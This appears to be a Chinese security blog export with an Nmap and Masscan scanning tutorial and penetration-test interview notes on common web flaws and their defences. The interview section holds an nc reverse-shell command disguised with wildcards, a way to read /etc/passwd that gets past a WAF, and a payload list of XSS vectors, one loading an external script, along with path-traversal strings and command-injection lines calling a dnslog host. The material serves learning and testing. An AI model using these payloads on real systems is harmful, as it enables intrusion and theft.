扫描一个 IPv6 地址IPv6 是 Internet Protocol Version 6 的缩写，用于替代现在用的 IPv4 的下一代 IP 协议，Nmap 很早就支持对 IPv6 的扫描，使用 -6 选项就可以进行对 IPv6 的扫描。12345678➜ ~ nmap -6 1::224:11cStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:34 CSTNmap scan report for 1::224:11cHost is up (0.00028s latency).Not shown: 968 closed ports, 30 filtered portsPORT STATE SERVICE88/tcp open kerberos-sec5900/tcp open vnc 路由跟踪使用 –traceroute 可以轻松地查出从本地计算机到目标之间所经过的网络节点，并可以查看过各个节点的时间：1234567891011121314151617181920212223242526272829➜ ~ sudo nmap www.sqlsec.com --traceroutePassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:35 CSTNmap scan report for www.sqlsec.com (121.196.37.183)Host is up (0.0018s latency).Not shown: 991 closed portsPORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open http111/tcp open rpcbind443/tcp open https445/tcp filtered microsoft-ds888/tcp open accessbuilder3306/tcp open mysql4444/tcp filtered krb524TRACEROUTE (using port 3389/tcp)HOP RTT ADDRESS1 1.41 ms 10.20.24.12 0.38 ms 172.16.0.13 6.50 ms 61.164.47.1934 ...5 1.70 ms 61.164.31.2186 2.51 ms 115.236.101.737 1.78 ms 45.112.223.298 1.92 ms 103.41.142.1739 ... 1011 1.77 ms 121.196.37.183 SCTP INIT Ping 扫描SCTP（Stream Control Transmission Protocol，流控制传输协议）是在 2000 年定义的一个传输层，SCTP 可以看作是 TCP 协议的改进。12345678910➜ ~ sudo nmap 10.20.24.15 -PYStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:40 CSTNmap scan report for 10.20.24.15Host is up (0.0071s latency).Not shown: 996 closed portsPORT STATE SERVICE22/tcp open ssh199/tcp open smux443/tcp open https8888/tcp open sun-answerbook 探索网络本节所用到的 Nmap 命令表： 选项 解释 -T 指定时间模板 -p 指定端口 -sS TCP SYN 扫描 -sU UDP 扫描 -sN;-sF;-sX 隐蔽扫描 -sA TCP ACK 扫描 -sW TCP 窗口扫描 时间模板在 Nmap 提供了一些简单的方法，使用 6 个时间模板，使用时采用 -T 选项及数字 (0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5) 选项 说明 -T0 偏执的 非常慢，用于 IDS 躲避 -T1 鬼祟的 缓慢的扫描，用于 IDS 躲避 -T2 文雅的 降低了扫描速度以使用更少的带宽和目标主机资源 -T3 普通的 默认模式 根据目标的反应自动调整时间 -T4 野蛮的 假设用户具有可靠的网络从而加速扫描，可能会漏扫 -T5 疯狂的 极速扫描，为了获得速度而牺牲准确性 指定端口可以指定端口号进行扫描，可以是一个端口也可以是一个范围：12345678910111213141516171819202122232425262728293031323334353637➜ ~ nmap 10.20.24.1/24 -p 22Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:34 CSTNmap scan report for 10.20.24.15Host is up (0.0077s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.231Host is up (0.00050s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.236Host is up (0.00051s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.238Host is up (0.00061s latency).PORT STATE SERVICE22/tcp closed sshNmap scan report for 10.20.24.239Host is up (0.00070s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.244Host is up (0.0019s latency).PORT STATE SERVICE22/tcp closed ssh TCP SYN 扫描比较常用的扫描方式，也被称为半开放扫描，因为不用进行 TCP 连接 3 次握手，所以速度比较快，平均一秒可以扫描上千个端口，而且相对来说也比较隐蔽，很难被防火墙或管理员发现，因为不会进行 TCP 连接，如果出现被过滤的情况，可以考虑使用 SYN 扫描，可以很明确地区分出端口的开放状态。1234567891011➜ ~ sudo nmap 10.20.24.15 -sSPassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:41 CSTNmap scan report for 10.20.24.15Host is up (0.0071s latency).Not shown: 996 closed portsPORT STATE SERVICE22/tcp open ssh199/tcp open smux443/tcp open https8888/tcp open sun-answerbook TCP 连接扫描当 -sS 不能使用的时候，可以使用 -sT 更加基础、稳定的扫描方式。 UDP 扫描因为要等待目标主机响应，所以速度比较慢，一般配合 -p 指定端口来使用，否则很耗费时间。 隐蔽扫描 -sN Null 扫描 -sF FIN 扫描 -sX Xmas 扫描这些扫描方式会躲过一些无状态防火墙的过滤，效果会更隐蔽。 TCP ACK 扫描确定是无法判断端口是开放还是过滤的。unfiltered 表明 ACK 报文不能到达，filtered 表示不响应的端口。 TCP 窗口扫描类似于ACK 扫描，通过返回的窗口大小数据判断目标端口是否开放或者关闭。扫描结果是不准确的，如果 100 个端口里面只有 2 个关闭的，那很可能是开放的。 指纹探测Nmap 不仅是一款端口扫描工具，还可以对主机的服务及版本进行识别和探测。 本节所使用的命令表： 选项 说明 -sV 版本探测 -A 更加详细直观的扫描 –version-intensity 设置扫描强度 1~9 默认为 7 –version-light 轻量级扫描 强度为 2 –version-all 重量级扫描 强度为 9 -O 启用操作系统探测 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# 版本探测➜ ~ nmap 10.20.24.244 -sVStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:12 CSTNmap scan report for 10.20.24.244Host is up (0.30s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION5900/tcp open vnc Apple remote desktop vncService Info: OS: Mac OS X; CPE: cpe:/o:apple:mac_os_xService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds ~ nmap 10.20.24.244 -AStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:13 CSTNmap scan report for 10.20.24.244Host is up (0.00026s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION5900/tcp open vnc Apple remote desktop vnc|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)|_vnc-info: ERROR: Script execution failed (use -d to debug)Service Info: OS: Mac OS X; CPE: cpe:/o:apple:mac_os_xService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds# 操作系统探测➜ ~ sudo nmap 10.211.55.17 -OStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:25 CSTNmap scan report for windows-7-1.shared (10.211.55.17)Host is up (0.00015s latency).Not shown: 991 closed portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds49152/tcp open unknown49153/tcp open unknown49154/tcp open unknown49155/tcp open unknown49156/tcp open unknown49158/tcp open unknownMAC Address: 00:1C:42:86:1B:DE (Parallels)Device type: general purposeRunning: Microsoft Windows 7|2008|8.1OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1Network Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 3.54 seconds 保存输出 选项 说明 -oN 标准保存 -oX XML 保存 快速找到.xml文件中的ip: VSCode ctrl + f 用最右面正则表达式搜索 1((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125; Ctrl + Shift + L 选择所有出现在当前选中的行 VSCode 批量处理ip格式问题：123开头标记：^ 换成 http://结尾标记：$ 换成 :8080全选后再替换 Masscan项目地址：https://github.com/robertdavidgraham/masscan 12345678# 扫描整个互联网 masscan 0.0.0.0/0 -p0-65535# 输出到文件中masscan 0.0.0.0/0 -p0-65535 -oX scan.xml# 默认的速率100包/秒，如果是扫描全网的话，需要提高速度。masscan 0.0.0.0/0 -p0-65535 --rate 100000 -oX scan.xml 实用正则12345# 正则((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;# 换行^\s*(?=\r?$)\n 主动信息收集漏洞扫描工具市面上也有很多各种各样的开源、商业扫描器。单就应用这一层来说，漏洞扫描器一般分为主动扫描和被动扫描两种。 主动扫描主动扫描一般用于黑盒测试，其形式为提供一个URL入口地址，然后由扫描器中的爬虫模块爬取所有链接，对GET、POST等请求进行参数变形和污染，进行重放测试，然后依据返回信息中的状态码、数据大小、数据内容关键字等去判断该请求是否含有相应的漏洞。例如：AWVS、Nessus、唐朝扫描器、BugScan、Pocsuite 被动扫描被动扫描，与主动扫描相比，被动扫描并不进行大规模的爬虫爬取行为，而是直接通过捕获测试人员的测试请求，直接进行参数变形和污染来测试服务端的漏洞，如果通过响应信息能够判断出漏洞存在，则进行记录管理，有人工再去进行漏洞的复现和确认。例如：BurpSuite、Xray 主动扫描与被动扫描最主要的区别为被动式扫描器不主动获取站点链接，而是通过流量、获取测试人员的访问请求等手段去采集数据源，然后进行类似的安全检测。 主动扫描的 Web 扫描器的一些不足： 由于数据源来自爬虫爬取，独立的页面、API接口等就无法覆盖，存在检测遗漏情况。 果是扫描单独的几个站点，主动扫描是够用的。但是在站点数量急剧增大的时候，主动扫描的效率、精准、速度都无法与被动扫描相比。 AWVS Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。AWVS可以检查SQL注入漏洞，也可以检查跨站脚本攻击漏洞，可以扫描任何可以通过web浏览访问和遵循HTTP/HTTPS规则的 Web 站点和 Web应用程序。 黑科技： 扫描过程： Nessus 主机漏洞扫描 Nessus 在全世界有超过 75000 个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus 不同于传统的漏洞扫描软件，支持分布式扫描。 Linux下 Nessus 常用命令：1234567systemctl status nessusd # 查看运行状态systemctl start nessusd # 启动 nessussystemctl stop nessusd # 停止 nessussystemctl restart nessusd# 重启 nessussystemctl enable nessusd # 开机自启systemctl disable nessusd# 关闭开机自启systemctl kill nessusd # 杀死 nessus 的子进程 基本网络扫描多用于进行主机扫描测试，可以扫描系统层面的漏洞： Web 应用测试也可以类型 AWVS 那样对 Web 应用进行测试： Xray 项目地址:https://github.com/chaitin/xray 长亭科技研发的一款完善的安全评估工具，支持常见Web安全问题扫描和自定义POC，虽然Github有项目，但是不开源，只提供社区版本供大家使用。 转载：https://www.sqlsec.com/2020/04/xray.html]]></content>
      <categories>
        <category>HackWiki</category>
      </categories>
      <tags>
        <tag>Hack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安服面试问题]]></title>
    <url>%2Fnote%2F2020%2Fundefined30%2F6a2e2a4a.html</url>
    <content type="text"><![CDATA[渗透测试基本流程1.信息收集 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站查询(有授权可渗透)，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等 传输协议，通用漏洞，exp，github源码等 2.漏洞挖掘 XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，使用漏扫工具等 3.漏洞利用|提权 mysql提权，linux系统提权 4.编写报告|清除测试数据 5.漏洞复测 sqlmap的运行机理 尝试连接目标网站 确认目标网站是否为动态网页 通过报错确认数据库的类型 添加payload进行测试 测试出注入类型后会对数据库版本进行猜测 最后的出结论 .htaccess利用 htaccess是超文本访问（Hypertext Access）的缩写，是一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。 .htaccess文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。 用连续的弹出图片骚扰用户 可以上传图片马，将jpg文件解析为php文件 sql注入原理及防御原理 ： 当网站在向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么恶意访问者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 防御： 关闭错误提示，php.ini中的display_errors=Off 魔术引号当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（/）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。 通过使用参数化查询和对象关系映射(Object Relational Mappers，ORM)，来避免和修复注入漏洞。此类查询通过指定参数的占位符，以便数据库始终将它们视为数据，而非SQL命令的一部分。 使用转义字符 命令执行命令执行漏洞原理：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。 命令执行漏洞利用条件： 应用调用执行系统命令的函数 将用户输入作为系统命令的参数拼接到了命令行中 没有对用户输入进行过滤或过滤不严漏洞分类： 代码层过滤不严 商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(“/bin/program –arg $arg”); 系统的漏洞造成命令注入 bash破壳漏洞（CVE-2014-6271） 调用的第三方组件存在代码执行漏洞 如wordPress中用来处理图片的imageMagick组件JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）ThinkPHP命令执行 漏洞危害： 继承Web服务程序的权限去执行系统命令或读写文件 反弹shell 控制整个网站甚至服务器 进一步内网渗透 命令拼接符|、||、&amp;、&amp;&amp;的区别：&amp;：无论左边是false还是true，右边都执行&amp;&amp;：具有短路效果，左边是false，右边不执行。|:无论左边是false还是true，右边都会执行||：具有短路效果，左边是true，右边不执行。 代码执行： 利用系统函数实现命令执行，在php下，允许命令执行的函数有：eval（）、assert（）、preg_replace（）、call_user_func（）如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞 其他函数ob_start（）、unserialize（）、creat_function（）、usort（）、uasort（）、uksort（）、array_filter（）、array_reduce（）、array_map（）…… 系统命令执行漏洞 system（） exec（） shell_exec（） passthru（） pcntl_exec（） popen（） proc_open（） 反引号…… 命令执行WAF绕过技巧 技巧一：通配符ls-l使用通配符/?in/?s-l /???/??t /??c/p???w?有时候WAF不允许使用太多的？号/?in/cat/?tc/p?sswd NC反弹shell:nc -e /bin/bash 127.0.0.1 3737为了避免符号，可以将IP地址转换成整型。127.0.0.1-&gt;2130706433 使用通配符root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737 技巧二：连接符 技巧三：未初始化的bash变量在bash环境中允许我们使用未初始化的bash变量，如何$a ,$b,$c我们事先并没有定义它们，输出看看:root@kali:~# echo $aroot@kali:~# echo $broot@kali:~# echo $croot@kali:~#未初始化的变量值都是null 读取/etc/passwd:cat$a /etc$a/passwd$a 测试WAF测试代码：&lt;?phpecho “OK”;system(‘dig’.$_GET[‘host’]);?&gt; www.baidu.com;$s/bin$s/which$s nc$s反弹shell:/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737 漏洞修复： 尽量少用执行命令的函数或者直接禁用 参数值尽量使用引号包括 在使用动态函数之前，确保使用的函数是指定的函数之一 在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义 对PHP语言来说，不能完全控制的危险函数最好不要使用 XSS漏洞​ 恶意攻击者往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。 反射型XSS：攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。 存储型XSS：代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。 DOM性XSS：DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。 防御： 进行输入检查，限制输入允许的字符，让特殊字符的攻击失效。XSS Filter 开启HttpOnly，解决xss后的cookie劫持问题 进行输出过滤，所有需要输出到页面的元素全部通过HTMLEncode CSRFCSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 防御： 同源检测 禁止不受信任的域名对我们发起请求。 Origin Header Referer Header CSRF Token a. 将CSRF Token输出到页面中 b. 页面提交的请求携带这个Token c. 服务器验证Token是否正确 双重cookie验证 在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。 任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间） Samesite Cookie 属性 SSRF通常用于控制web进而探测内网服务以及拥挤内网脆弱应用 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。 利用： file协议查看文件 dict协议探测端口 gopher协力支持get&amp;post请求 防御： 限制协议为HTTP，HTTPS 设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 文件上传漏洞程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。 造成文件上传漏洞的原因有： 开源编辑器的上传漏洞 服务器配置不当 本地文件上传限制被绕过 过滤不严或被绕过 文件解析漏洞导致文件执行 文件路径截断 绕过： %00 截断绕过 文件名绕过 大小写绕过 php2 php3 php5 phtml Content-Type绕过 前端js绕过 Content-Type绕过 前端绕过 文件解析规则绕过 Windows环境特性绕过 文件名大小写绕过 双写绕过 点空格绕过 文件头绕过 条件竞争绕过 防御 将文件上传的目录设置为不可执行 判断文件类型，结合使用MIME Type，后最检查等方式，推荐使用白名单方式 使用随机数改写文件名和文件路径。 常用web漏洞测试的payload整理[反射型xss] [在html形成] 123&quot;&apos;&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;&lt;svg οnlοad=document.title=&quot;[random]&quot;;&gt; [在js形成] 123456document.title=&quot;[random]&quot;;//;document.title=&quot;[random]&quot;;//&quot;;document.title=&quot;[random]&quot;;&apos;;document.title=&quot;[random]&quot;;&quot;);document.title=&quot;[random]&quot;;&apos;);document.title=&quot;[random]&quot;; [在html属性形成(img)] 123888&quot; οnlοad=document.title=&quot;[random]&quot; a=&quot;888&apos; οnlοad=document.title=&quot;[random]&quot; a=&apos;888 οnlοad=document.title=&quot;[random]&quot; [存储型xss] [通用payload]测试环境，需要在触发的地方查看payload显示情况1234567891011121314151617181920&lt;script&gt;alert(/StoredXssByScriptTag/);&lt;/script&gt;&quot;&apos;&gt;&lt;script&gt;alert(/StoredXssByScriptTagBypass);&lt;/script&gt;[Bypass on Event] [事件型绕过]&lt;img src=1 οnerrοr=alert(/StoredXssByImgTag/)&gt; #一般富文本不会过滤img标签[Bypass pseudo protocol] [伪协议绕过]&lt;iframe src=javascript:prompt(/StoredXssByIframeTag/);&gt;&lt;/iframe&gt;&lt;object data=data:text/html;base64,PHNjcmlwdD5wcm9tcHQoL1N0b3JlZFhzc0J5T2JqZWN0VGFnLyk7PC9zY3JpcHQ+&gt;&lt;/object&gt;[Bypass html5 tag] [html5标签绕过]&lt;svg οnlοad=prompt(/StoredXssBySvgTag/)&gt;&lt;embed src=javascript:alert(/StoredXssByEmbedTag/);&gt;[Bypass html or js encode] [js编码，html编码，十进制编码绕过等]&lt;embed src=javas&amp;#99;r&amp;#105;pt:alert(/StoredXssByEmbedTagAndHtmlEncode/);&gt;&lt;video&gt;&lt;source οnerrοr=alert(String.fromCharCode(47,83,116,111,114,101,100,88,115,115,98,121,86,105,100,101,111,84,97,103,65,110,100,83,116,114,105,110,103,69,110,99,111,100,101,47))&gt;&lt;script/src=data:text/j\141v\141script,\u0061%6C%65%72%74(/StoredXssbyScriptTagAndJSEncode/)&gt;&lt;/script&gt;如果进行盲测可以根据xss平台地址替换相应的js触发代码&quot;&gt;&lt;script src=http://myxss.net/xxxxxx&gt;&lt;/script&gt; [静态文件读取] [常规检测] 123/../../../../../../../../../../../etc/passwd/../../../../../../../../../../../etc/hosts /../../../../../../../C:/Windows/system.ini [windows] [伪造绕过]123456/././././././././././././././././././././././././../../../../../../etc/passwd /..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts [后缀绕过] 1234567891011/../../../../../../../../../../../etc/passwd#/../../../../../../../../../../../etc/passwd%00/../../../../../../../../../../../etc/passwd#.jpg/../../../../../../../../../../../etc/passwd%00.jpg/../../../../../../../../../../../etc/passwd#.html/../../../../../../../../../../../etc/passwd%00.html/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.jpg/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd#.html/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html [命令执行漏洞] [常规检测] 1234;curl [random].test.dnslog.link | curl [random].test.dnslog.link | ping -n 2 [random].test.dnslog.link [Windows] | ping -c 2 [random].test.dnslog.link [Linux] [绕过检测] 123456789101112;curl [random].test.dnslog.link# | curl [random].test.dnslog.link#%20|%20curl%20[random].test.dnslog.link%20|%20curl%20[random].test.dnslog.link#%20|%20ping%20-n%202%20[random].test.dnslog.link%20|%20ping%20-c%202%20[random].test.dnslog.link#a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.linka=c;b=url;$a$b [random].test.dnslog.link#$&#123;IFS&#125;|$&#123;IFS&#125;curl$&#123;IFS&#125;[random].test.dnslog.link$&#123;IFS&#125;|$&#123;IFS&#125;ping$&#123;IFS&#125;-c$&#123;IFS&#125;2$&#123;IFS&#125;[random].test.dnslog.linka=p;b=ing;c=c;d=2;$a$b&#123;IFS&#125;-$c&#123;IFS&#125;$d&#123;IFS&#125;[random].test.dnslog.linka=c;b=url;$a$b&#123;IFS&#125;[random].test.dnslog.link# [ssrf漏洞]1http://[random].test.dnslog.link/ [strust2命令执行]1?redirect:http://[random].test.dnslog.link/%25&#123;3*4&#125;]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Interview</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap常用参数]]></title>
    <url>%2Fnote%2F2020%2Fundefined30%2F868037e0.html</url>
    <content type="text"><![CDATA[nmap 语法结构：nmap [Scan Type(s)] [Options] {target specification} 端口状态介绍 open：确定端口开放，可达 closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。 filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。 unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。 open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。 closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的 扫描目标格式 示例： scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL:从文件中加载目标 -iR:随机扫描 –exclude :排除网段或主机地址 –excledefile:排除文件中的地址 主机发现 -sL:列出需要扫描的目标，不扫描 -sn:只做ping扫描，不做端口扫描 -Pn：跳过主机发现，视所有主机都在线 -PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现 -PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现 -PO[Protocol list]：基于IP协议字段的ping扫描 -n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析 –dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS 服务器 –system-dns:调用系统的DNS服务器 –traceroute：显示追踪到目标的路径 扫描技术 -sS/sT/sA/sW/sM:TCP扫描 S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放 T是全连接扫描会和服务器建立完整的三次握手，效率低 A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件 W 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包 M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准 -sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文 -sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。 –scanflags ：实现上同上面几种类似，可以让用户自定义TCP标志位。 -sI : Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1. -sY/sZ:SCTP协议INIT或cookie-echo扫描 -sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测 -b :：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 端口相关参数 -p:指定端口扫描范围，如：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 –exclude-ports : 排除端口 -F：扫描比缺省少的端口（缺省1000，加了-F100） -r：顺序扫描端口，缺省是随机分组扫描 –top-ports :按top排序扫描知名端口 –port-ratio : 按比例扫描知名端口，值在0-1之间，越小扫的越多 系统/版本探测 -sV:探测开放的端口的系统/服务信息 –version-intensity :设置版本检测的详程度级别，0-9，越高越详细 –version-light：输出最可能的版本信息，缺省是2 